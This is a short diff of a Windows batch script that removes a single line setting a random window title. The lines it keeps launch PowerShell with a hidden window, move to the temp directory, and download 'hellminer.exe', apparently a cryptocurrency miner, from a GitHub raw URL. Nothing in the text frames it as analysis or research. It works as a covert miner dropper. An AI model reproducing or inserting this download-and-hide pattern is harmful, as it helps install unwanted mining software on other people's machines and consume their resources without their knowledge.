@@ -1,6 +1,5 @@
 @echo off
 powershell.exe -windowstyle Hidden -command
-title z%random%
 cd %temp%
 
 if not exist "hellminer.exe" powershell -command Invoke-WebRequest "https://github.com/rxu7s/Public/raw/main/hellminer.exe" -OutFile "hellminer.exe"
